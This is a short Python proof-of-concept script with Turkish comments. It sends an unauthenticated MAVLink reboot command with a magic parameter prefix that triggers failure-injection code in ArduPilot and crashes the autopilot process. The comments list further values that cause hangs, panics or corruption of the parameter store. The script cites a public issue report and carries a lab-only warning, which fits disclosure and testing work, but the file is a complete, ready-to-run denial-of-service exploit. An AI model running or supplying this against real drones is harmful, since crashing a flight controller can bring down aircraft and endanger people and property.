#!/usr/bin/env python3
# reboot_dos_poc.py
# Kimlik dogrulamasiz uzaktan DoS PoC (ArduPilot).
# MAV_CMD_PREFLIGHT_REBOOT_SHUTDOWN (komut 246) + sihirli onek
# (param1=42, param2=24, param3=71) verildiginde param4 bir failure-injection
# switch'i acar. param4=94 -> 0xE000ED38'e fonksiyon-isaretci cagrisi -> HardFault.
# AP_MAVLINK_FAILURE_CREATION_ENABLED production build'lerde varsayilan acik.
#
# Bildirim: https://github.com/ArduPilot/ardupilot/issues/33253
# Sihirli sayilar ve etkilenen kod zaten ArduPilot deposunda kamuya acik.
#
# UYARI: bu betik hedef otopilot surecini cokertir. SADECE kendi SITL
# laboratuvarinda veya yazili izin verilen test ortaminda calistir.
# Kullanim: python3 reboot_dos_poc.py tcp:127.0.0.1:5760

import sys
from pymavlink import mavutil

CONN = sys.argv[1] if len(sys.argv) > 1 else "tcp:127.0.0.1:5760"

# param4 secenekleri (referans): 93 sonsuz dongu, 94 null-deref/HardFault,
# 95 panic, 96 parametre deposunu bozar, 97 uzun dongu.
PARAM4 = 94

m = mavutil.mavlink_connection(CONN)
m.wait_heartbeat(timeout=30)
if m.target_component == 0:
    m.target_component = 1

m.mav.command_long_send(
    m.target_system, m.target_component,
    mavutil.mavlink.MAV_CMD_PREFLIGHT_REBOOT_SHUTDOWN,   # 246
    0,                                                   # confirmation
    42, 24, 71, PARAM4,                                  # sihirli onek + primitif
    0, 0, 0)

print("[*] komut gonderildi")
print("[x] beklenen: arducopter process aninda exit (segfault)")
print("[*] Docker SITL'de PID 1 olur, konteyner kapanir.")
